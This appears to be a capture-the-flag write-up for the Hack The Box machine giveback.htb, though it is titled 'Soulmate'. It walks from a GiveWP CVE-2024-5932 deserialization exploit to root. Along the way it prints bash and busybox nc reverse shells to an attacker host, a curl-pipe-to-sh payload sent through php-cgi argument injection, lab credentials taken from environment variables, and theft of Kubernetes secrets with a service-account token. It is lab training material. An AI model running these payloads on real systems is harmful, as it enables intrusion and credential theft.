---
title: Soulmate HTB-Writeup
date: 2026-02-22 18:49 +0100
categories: [Writeups, Medium]
tags: [Linux, CVE-2024-5932, CMS, RCE, Kubernetes, SSH,SUID]
---

```sh
IP=10.129.69.104
```

```sh
sudo nmap -p- --open -v --min-rate 5000 -n -Pn $IP -oG allPorts

PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
30686/tcp open  unknown
```

```sh
sudo nmap -p22,80,30686 -sSVC --open -v --min-rate 5000 -n -Pn $IP -oG Ports.txt

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 66:f8:9c:58:f4:b8:59:bd:cd:ec:92:24:c3:97:8e:9e (ECDSA)
|_  256 96:31:8a:82:1a:65:9f:0a:a2:6c:ff:4d:44:7c:d3:94 (ED25519)
80/tcp    open  http    nginx 1.28.0
|_http-title: GIVING BACK IS WHAT MATTERS MOST &#8211; OBVI
|_http-generator: WordPress 6.8.1
|_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
|_http-server-header: nginx/1.28.0
| http-methods: 
|_  Supported Methods: GET HEAD
30686/tcp open  http    Golang net/http server
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 078C07D5669A42740EF813D5300EBA4D
|_http-title: Site doesn't have a title (application/json).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Sun, 02 Nov 2025 16:45:31 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|     "serviceProxyHealthy": true
|   GenericLines, Help, LPDString, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Load-Balancing-Endpoint-Weight: 1
|     Date: Sun, 02 Nov 2025 16:45:14 GMT
|     Content-Length: 127
|     "service": {
|     "namespace": "default",
|     "name": "wp-nginx-service"
|     "localEndpoints": 1,
|_    "serviceProxyHealthy": true
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port30686-TCP:V=7.95%I=7%D=11/2%Time=69078A98%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Bal
SF:ancing-Endpoint-Weight:\x201\r\nDate:\x20Sun,\x2002\x20Nov\x202025\x201
SF:6:45:14\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\
SF:n\t\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-servic
SF:e\"\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20t
SF:rue\n}")%r(HTTPOptions,132,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20
SF:application/json\r\nX-Content-Type-Options:\x20nosniff\r\nX-Load-Balanc
SF:ing-Endpoint-Weight:\x201\r\nDate:\x20Sun,\x2002\x20Nov\x202025\x2016:4
SF:5:14\x20GMT\r\nContent-Length:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t
SF:\t\"namespace\":\x20\"default\",\n\t\t\"name\":\x20\"wp-nginx-service\"
SF:\n\t},\n\t\"localEndpoints\":\x201,\n\t\"serviceProxyHealthy\":\x20true
SF:\n}")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnec
SF:tion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,132,"
SF:HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20application/json\r\nX-Conten
SF:t-Type-Options:\x20nosniff\r\nX-Load-Balancing-Endpoint-Weight:\x201\r\
SF:nDate:\x20Sun,\x2002\x20Nov\x202025\x2016:45:31\x20GMT\r\nContent-Lengt
SF:h:\x20127\r\n\r\n{\n\t\"service\":\x20{\n\t\t\"namespace\":\x20\"defaul
SF:t\",\n\t\t\"name\":\x20\"wp-nginx-service\"\n\t},\n\t\"localEndpoints\"
SF::\x201,\n\t\"serviceProxyHealthy\":\x20true\n}")%r(LPDString,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Exploit link: <a src="https://github.com/EQSTLab/CVE-2024-5932">https://github.com/EQSTLab/CVE-2024-5932</a>
```sh
python CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c "bash -c 'bash -i >& /dev/tcp/10.10.X.X/6969 0>&1'"
                                                                                                                                                                                                                                                                                                            
             ..-+*******-                                                                                  
            .=#+-------=@.                        .:==:.                                                   
           .**-------=*+:                      .-=++.-+=:.                                                 
           +*-------=#=+++++++++=:..          -+:==**=+-+:.                                                
          .%----=+**+=-:::::::::-=+**+:.      ==:=*=-==+=..                                                
          :%--**+-::::::::::::::::::::+*=:     .::*=**=:.                                                  
   ..-++++*@#+-:::::::::::::::::::::::::-*+.    ..-+:.                                                     
 ..+*+---=#+::::::::::::::::::::::::::::::=*:..-==-.                                                       
 .-#=---**:::::::::::::::::::::::::=+++-:::-#:..            :=+++++++==.   ..-======-.     ..:---:..       
  ..=**#=::::::::::::::::::::::::::::::::::::%:.           *@@@@@@@@@@@@:.-#@@@@@@@@@%*:.-*%@@@@@@@%#=.    
   .=#%=::::::::::::::::::::::::::::::::-::::-#.           %@@@@@@@@@@@@+:%@@@@@@@@@@@%==%@@@@@@@@@@@%-    
  .*+*+:::::::::::-=-::::::::::::::::-*#*=::::#: ..*#*+:.  =++++***%@@@@+-@@@#====%@@@%==@@@#++++%@@@%-    
  .+#*-::::::::::+*-::::::::::::::::::+=::::::-#..#+=+*%-.  :=====+#@@@@-=@@@+.  .%@@@%=+@@@+.  .#@@@%-    
   .+*::::::::::::::::::::::::+*******=::::::--@.+@#+==#-. #@@@@@@@@@@@@.=@@@%*++*%@@@%=+@@@#====@@@@%-    
   .=+:::::::::::::=*+::::::-**=-----=#-::::::-@%+=+*%#:. .@@@@@@@@@@@%=.:%@@@@@@@@@@@#-=%@@@@@@@@@@@#-    
   .=*::::::::::::-+**=::::-#+--------+#:::-::#@%*==+*-   .@@@@#=----:.  .-+*#%%%%@@@@#-:+#%@@@@@@@@@#-    
   .-*::::::::::::::::::::=#=---------=#:::::-%+=*#%#-.   .@@@@%######*+.       .-%@@@#:  .....:+@@@@*:    
    :+=:::::::::::-:-::::-%=----------=#:::--%++++=**      %@@@@@@@@@@@@.        =%@@@#.        =@@@@*.    
    .-*-:::::::::::::::::**---------=+#=:::-#**#*+#*.      -#%@@@@@@@@@#.        -%@@%*.        =@@@@+.    
.::-==##**-:::-::::::::::%=-----=+***=::::=##+#=.::         ..::----:::.         .-=--.         .=+=-.     
%+==--:::=*::::::::::::-:+#**+=**=::::::-#%=:-%.                                                           
*+.......+*::::::::::::::::-****-:::::=*=:.++:*=                                                           
.%:..::::*@@*-::::::::::::::-+=:::-+#%-.   .#*#.                                                           
 ++:.....#--#%**=-:::::::::::-+**+=:@#....-+*=.                                                            
 :#:....:#-::%..-*%#++++++%@@@%*+-.#-=#+++-..                                                              
 .++....-#:::%.   .-*+-..*=.+@= .=+..-#                                                                    
 .:+++#@#-:-#= ...   .-++:-%@@=     .:#                                                                    
     :+++**##@#+=.      -%@@@%-   .-=*#.                                                                   
    .=+::+::-@:         #@@@@+. :+*=::=*-                                                                  
    .=+:-**+%%+=-:..    =*#*-..=*-:::::=*                                                                  
     :++---::--=*#+*+++++**+*+**-::::::+=                                                                  
      .+*=:::---+*:::::++++++*+=:::::-*=.                                                                  
       .:=**+====#*::::::=%:...-=++++=.      Author: EQST(Experts, Qualified Security Team)
           ..:----=**++++*+.                 Github: https://github.com/EQSTLab/CVE-2024-5932    

                                                                                                                                                                                                                                                                                                         
Analysis base : https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/

=============================================================================================================    

CVE-2024-5932 : GiveWP unauthenticated PHP Object Injection
description: The GiveWP  Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.
Arbitrary File Deletion

============================================================================================================= 
    
[\] Exploit loading, please wait...
[+] Requested Data: 
{'give-form-id': '17', 'give-form-hash': '1a76ef6e19', 'give-price-id': '0', 'give-amount': '$10.00', 'give_first': 'Richard', 'give_last': 'White', 'give_email': 'meyergary@example.net', 'give_title': 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:52:"bash -c \'bash -i >& /dev/tcp/10.10.X.X/6969 0>&1\'";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}', 'give-gateway': 'offline', 'action': 'give_process_donation'}
```

```sh
penelope -p 6969                   
[+] Listening for reverse shells on 0.0.0.0:6969 →  127.0.0.1 • 192.168.1.161 • 10.10.14.193
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from beta-vino-wp-wordpress-7685fc7bd5-dkzxm~10.129.69.104-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.14.193:6969
[+] Got reverse shell from beta-vino-wp-wordpress-7685fc7bd5-dkzxm~10.129.69.104-Linux-x86_64 😍 Assigned SessionID <2>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/cibaism/.penelope/sessions/beta-vino-wp-wordpress-7685fc7bd5-dkzxm~10.129.69.104-Linux-x86_64/2025_11_02-17_48_53-657.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

I have no name!@beta-vino-wp-wordpress-7685fc7bd5-dkzxm:/opt/bitnami/wordpress/wp-admin$
```

```sh
I have no name!@beta-vino-wp-wordpress-7685fc7bd5-dkzxm:/opt/bitnami/wordpress/wp-admin$ env
SHELL=/usr/bin/bash
KUBERNETES_SERVICE_PORT_HTTPS=443
BETA_VINO_WP_MARIADB_SERVICE_PORT=3306
WORDPRESS_SMTP_PASSWORD=
WORDPRESS_SMTP_FROM_EMAIL=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PORT=443
WEB_SERVER_HTTP_PORT_NUMBER=8080
WORDPRESS_RESET_DATA_PERMISSIONS=no
KUBERNETES_SERVICE_PORT=443
WORDPRESS_EMAIL=user@example.com
WP_CLI_CONF_FILE=/opt/bitnami/wp-cli/conf/wp-cli.yml
WORDPRESS_DATABASE_HOST=beta-vino-wp-mariadb
MARIADB_PORT_NUMBER=3306
MODULE=wordpress
WORDPRESS_SMTP_FROM_NAME=FirstName LastName
HOSTNAME=beta-vino-wp-wordpress-7685fc7bd5-dkzxm
WORDPRESS_SMTP_PORT_NUMBER=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PROTO=tcp
WORDPRESS_EXTRA_CLI_ARGS=
APACHE_BASE_DIR=/opt/bitnami/apache
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PORT=5000
APACHE_VHOSTS_DIR=/opt/bitnami/apache/conf/vhosts
WEB_SERVER_DEFAULT_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_PORT_80_TCP=tcp://10.43.4.242:80
WORDPRESS_ENABLE_DATABASE_SSL=no
WP_NGINX_SERVICE_PORT_80_TCP_PROTO=tcp
APACHE_DAEMON_USER=daemon
BITNAMI_ROOT_DIR=/opt/bitnami
LEGACY_INTRANET_SERVICE_SERVICE_HOST=10.43.2.241
WORDPRESS_BASE_DIR=/opt/bitnami/wordpress
WORDPRESS_SCHEME=http
WORDPRESS_LOGGED_IN_SALT=
BETA_VINO_WP_WORDPRESS_PORT_80_TCP=tcp://10.43.61.204:80
WORDPRESS_DATA_TO_PERSIST=wp-config.php wp-content
WORDPRESS_HTACCESS_OVERRIDE_NONE=no
WORDPRESS_DATABASE_SSL_CERT_FILE=
APACHE_HTTPS_PORT_NUMBER=8443
PWD=/opt/bitnami/wordpress/wp-admin
OS_FLAVOUR=debian-12
WORDPRESS_CONF_FILE=/opt/bitnami/wordpress/wp-config.php
WORDPRESS_SMTP_PROTOCOL=
LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
WP_CLI_BASE_DIR=/opt/bitnami/wp-cli
WORDPRESS_VOLUME_DIR=/bitnami/wordpress
WP_CLI_CONF_DIR=/opt/bitnami/wp-cli/conf
APACHE_BIN_DIR=/opt/bitnami/apache/bin
BETA_VINO_WP_MARIADB_SERVICE_PORT_MYSQL=3306
WORDPRESS_PLUGINS=none
WORDPRESS_FIRST_NAME=FirstName
MARIADB_HOST=beta-vino-wp-mariadb
WORDPRESS_EXTRA_WP_CONFIG_CONTENT=
WORDPRESS_MULTISITE_ENABLE_NIP_IO_REDIRECTION=no
WORDPRESS_DATABASE_USER=bn_wordpress
PHP_DEFAULT_UPLOAD_MAX_FILESIZE=80M
WORDPRESS_AUTH_KEY=
BETA_VINO_WP_MARIADB_PORT_3306_TCP=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_NETWORK_TYPE=subdomain
WORDPRESS_DATABASE_SSL_KEY_FILE=
APACHE_DEFAULT_CONF_DIR=/opt/bitnami/apache/conf.default
WORDPRESS_LOGGED_IN_KEY=
APACHE_CONF_DIR=/opt/bitnami/apache/conf
HOME=/
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
WEB_SERVER_DAEMON_GROUP=daemon
PHP_DEFAULT_POST_MAX_SIZE=80M
WORDPRESS_ENABLE_HTTPS=no
BETA_VINO_WP_WORDPRESS_SERVICE_PORT=80
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTPS=443
WORDPRESS_TABLE_PREFIX=wp_
WORDPRESS_DATABASE_PORT_NUMBER=3306
WORDPRESS_DATABASE_NAME=bitnami_wordpress
LEGACY_INTRANET_SERVICE_SERVICE_PORT_HTTP=5000
APACHE_HTTP_PORT_NUMBER=8080
WP_NGINX_SERVICE_SERVICE_HOST=10.43.4.242
WP_NGINX_SERVICE_PORT=tcp://10.43.4.242:80
APACHE_DEFAULT_HTTP_PORT_NUMBER=8080
WP_CLI_DAEMON_GROUP=daemon
BETA_VINO_WP_MARIADB_PORT=tcp://10.43.147.82:3306
WORDPRESS_MULTISITE_FILEUPLOAD_MAXK=81920
WORDPRESS_AUTO_UPDATE_LEVEL=none
BITNAMI_DEBUG=false
LEGACY_INTRANET_SERVICE_SERVICE_PORT=5000
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_ADDR=10.43.2.241
WORDPRESS_USERNAME=user
BETA_VINO_WP_WORDPRESS_PORT=tcp://10.43.61.204:80
WORDPRESS_ENABLE_XML_RPC=no
WORDPRESS_BLOG_NAME=User's Blog!
APACHE_PID_FILE=/opt/bitnami/apache/var/run/httpd.pid
WP_NGINX_SERVICE_PORT_80_TCP_ADDR=10.43.4.242
WORDPRESS_AUTH_SALT=
APACHE_LOGS_DIR=/opt/bitnami/apache/logs
WORDPRESS_EXTRA_INSTALL_ARGS=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_PORT=3306
APACHE_DAEMON_GROUP=daemon
WORDPRESS_NONCE_KEY=
WEB_SERVER_HTTPS_PORT_NUMBER=8443
WORDPRESS_SMTP_HOST=
WP_NGINX_SERVICE_SERVICE_PORT_HTTP=80
TERM=xterm-256color
APACHE_DEFAULT_HTTPS_PORT_NUMBER=8443
WORDPRESS_NONCE_SALT=
APACHE_CONF_FILE=/opt/bitnami/apache/conf/httpd.conf
WORDPRESS_MULTISITE_EXTERNAL_HTTP_PORT_NUMBER=80
BETA_VINO_WP_WORDPRESS_PORT_443_TCP=tcp://10.43.61.204:443
WEB_SERVER_DEFAULT_HTTPS_PORT_NUMBER=8443
WORDPRESS_LAST_NAME=LastName
WP_NGINX_SERVICE_SERVICE_PORT=80
WP_NGINX_SERVICE_PORT_80_TCP_PORT=80
WORDPRESS_ENABLE_MULTISITE=no
WORDPRESS_SKIP_BOOTSTRAP=no
WORDPRESS_MULTISITE_EXTERNAL_HTTPS_PORT_NUMBER=443
SHLVL=4
WORDPRESS_SECURE_AUTH_SALT=
BETA_VINO_WP_MARIADB_PORT_3306_TCP_ADDR=10.43.147.82
BITNAMI_VOLUME_DIR=/bitnami
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PORT=80
KUBERNETES_PORT_443_TCP_PROTO=tcp
BITNAMI_APP_NAME=wordpress
WORDPRESS_DATABASE_PASSWORD=sW5sp4spa3u7RLyetrekE4oS
BETA_VINO_WP_WORDPRESS_SERVICE_HOST=10.43.61.204
APACHE_HTDOCS_DIR=/opt/bitnami/apache/htdocs
WEB_SERVER_GROUP=daemon
WORDPRESS_PASSWORD=O8F7KR5zGi
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
APACHE_HTACCESS_DIR=/opt/bitnami/apache/conf/vhosts/htaccess
WORDPRESS_DEFAULT_DATABASE_HOST=mariadb
WORDPRESS_SECURE_AUTH_KEY=
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_PROTO=tcp
APACHE_TMP_DIR=/opt/bitnami/apache/var/run
APP_VERSION=6.8.1
BETA_VINO_WP_WORDPRESS_PORT_443_TCP_ADDR=10.43.61.204
ALLOW_EMPTY_PASSWORD=yes
WP_CLI_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_SERVICE_PORT_HTTP=80
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
WP_CLI_BIN_DIR=/opt/bitnami/wp-cli/bin
WORDPRESS_VERIFY_DATABASE_SSL=yes
OS_NAME=linux
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_PROTO=tcp
PATH=/opt/bitnami/apache/bin:/opt/bitnami/common/bin:/opt/bitnami/common/bin:/opt/bitnami/mysql/bin:/opt/bitnami/common/bin:/opt/bitnami/php/bin:/opt/bitnami/php/sbin:/opt/bitnami/apache/bin:/opt/bitnami/mysql/bin:/opt/bitnami/wp-cli/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_SERVER_TOKENS=Prod
LEGACY_INTRANET_SERVICE_PORT_5000_TCP_PROTO=tcp
WORDPRESS_ENABLE_HTACCESS_PERSISTENCE=no
WORDPRESS_ENABLE_REVERSE_PROXY=no
LEGACY_INTRANET_SERVICE_PORT=tcp://10.43.2.241:5000
WORDPRESS_SMTP_USER=
WEB_SERVER_TYPE=apache
WORDPRESS_MULTISITE_HOST=
PHP_DEFAULT_MEMORY_LIMIT=512M
WORDPRESS_OVERRIDE_DATABASE_SETTINGS=no
WORDPRESS_DATABASE_SSL_CA_FILE=
OS_ARCH=amd64
WEB_SERVER_DAEMON_USER=daemon
BETA_VINO_WP_WORDPRESS_PORT_80_TCP_ADDR=10.43.61.204
BETA_VINO_WP_MARIADB_SERVICE_HOST=10.43.147.82
_=/usr/bin/env
```

```sh
nano cibaism
    
busybox nc 10.10.X.X 4442 -e /bin/sh
```

```sh
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```sh
php -r "\$c=stream_context_create(['http'=>['method'=>'POST','content'=>'curl 10.10.x.x:8000/cibaism|sh']]); echo file_get_contents('http://10.43.2.241:5000/cgi-bin/php-cgi?-d+allow_url_include=1+-d+auto_prepend_file=php://input',0,\$c);"
```

```sh
penelope -p 4442
[+] Listening for reverse shells on 0.0.0.0:4442 →  127.0.0.1 • 192.168.1.161 • 10.10.14.193
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from legacy-intranet-cms-6f7bf5db84-jm6bz~10.129.69.104-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.14.193:4442
[+] Got reverse shell from legacy-intranet-cms-6f7bf5db84-jm6bz~10.129.69.104-Linux-x86_64 😍 Assigned SessionID <2>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/cibaism/.penelope/sessions/legacy-intranet-cms-6f7bf5db84-jm6bz~10.129.69.104-Linux-x86_64/2025_11_02-17_55_36-479.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[-] Spawn MANUALLY a new shell for this session to operate properly
/var/www/html/cgi-bin # 
```

```sh
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://kubernetes.default.svc/api/v1/namespaces/default/secrets

      },
      "type": "helm.sh/release.v1"
    },
    {
      "metadata": {
        "name": "user-secret-babywyrm",
        "namespace": "default",
        "uid": "9473b005-6041-4a51-89ac-dc339d54d1fa",
        "resourceVersion": "2856243",
        "creationTimestamp": "2025-11-02T16:36:40Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-babywyrm",
            "uid": "1ca0ff51-999e-4c56-b9aa-27ec3f354ac5",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-11-02T16:36:40Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:MASTERPASS": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"1ca0ff51-999e-4c56-b9aa-27ec3f354ac5\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "MASTERPASS": "NFNrQ21ieWpvZG1BUk1MQ09pd0M0M2NQWUxDNWF5OQ=="
      },
      "type": "Opaque"
    }
  ]
}
```

```sh
echo -n "NFNrQ21ieWpvZG1BUk1MQ09pd0M0M2NQWUxDNWF5OQ==" | base64 -d ;echo
4SkCmbyjodmARMLCOiwC43cPYLC5ay9
```

```sh
penelope ssh babywyrm@giveback.htb 
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.161 • 10.10.14.193
babywyrm@giveback.htb's password: 4SkCmbyjodmARMLCOiwC43cPYLC5ay9
[+] SSH command executed!
[+] Got reverse shell from giveback.htb~10.129.69.104-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/cibaism/.penelope/sessions/giveback.htb~10.129.69.104-Linux-x86_64/2025_11_02-18_00_06-478.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
babywyrm@giveback:~$ 
```

```sh
babywyrm@giveback:~$ sudo -l
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, timestamp_timeout=0, timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```

Es la credencial de `mariadb-root-passwd`. Esta credencial es también la administrative.
```sh
echo -n 'sW5sp4spa3u7RLyetrekE4oS' | base64 

c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T
```

```sh
babywyrm@giveback:~$ mkdir -p /tmp/final
```

```sh
babywyrm@giveback:~$ cd /tmp/final
babywyrm@giveback:/tmp/final$ cat > config.json << 'EOF'
{
    "ociVersion": "1.0.0",
    "process": {
        "user": {"uid": 0, "gid": 0},
        "args": ["/usr/bin/bash"],
        "cwd": "/"
    },
    "root": {"path": "/"}
}
EOF
```

```sh
babywyrm@giveback:/tmp/final$ sudo /opt/debug run final
Validating sudo...
Please enter the administrative password: c1c1c3A0c3BhM3U3Ukx5ZXRyZWtFNG9T

Both passwords verified. Executing the command...
> whoami
root

> ls -la /root
total 100
drwx------ 15 root root 4096 Nov  2 16:36 .
drwxr-xr-x 20 root root 4096 Oct  3 16:21 ..
lrwxrwxrwx  1 root root    9 Oct  2 20:28 .bash_history -> /dev/null
-rw-r--r--  1 root root 3286 Oct 20  2024 .bashrc
drwx------  4 root root 4096 Sep 21  2024 .cache
drwx------  5 root root 4096 Sep 21  2024 .config
drwx------  3 root root 4096 Jul 24 00:59 .docker
drwxr-x---  3 root root 4096 Sep 21  2024 .kube
-rw-------  1 root root   20 Oct 27 15:52 .lesshst
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root    0 Sep 25  2024 .selected_editor
drwx------  2 root root 4096 Sep 28  2024 .ssh
-rw-r--r--  1 root root    0 Sep 21  2024 .sudo_as_admin_successful
drwxr-xr-x  2 root root 4096 Sep 29  2024 .vim
-rw-r--r--  1 root root   14 Oct 16  2024 .vimrc
-rw-r--r--  1 root root   46 Oct 16  2024 .wgetrc
drwxr-xr-x  3 root root 4096 Sep 24 20:06 HTB
-rwx------  1 root root 5001 Jul 27 03:47 audit__.sh
drwxr-xr-x  2 root root 4096 Aug 29 03:16 coredns
-rwxr-xr-x  1 root root  416 Oct 27 09:44 dns.sh
drwxr-x---  3 root root 4096 Jul 30 03:09 helm
-rwxr-xr-x  1 root root  382 Oct  1 14:00 iptables_rules.sh
drwxr-x---  2 root root 4096 Sep 23  2024 kubeseal
drwxr-x---  3 root root 4096 Aug  2 17:01 phpcgi
drwxr-x---  4 root root 4096 Nov 14  2024 python
-rw-r-----  1 root root   33 Nov  2 16:36 root.txt
drwxr-x---  4 root root 4096 Sep 24 20:02 wordpress
```
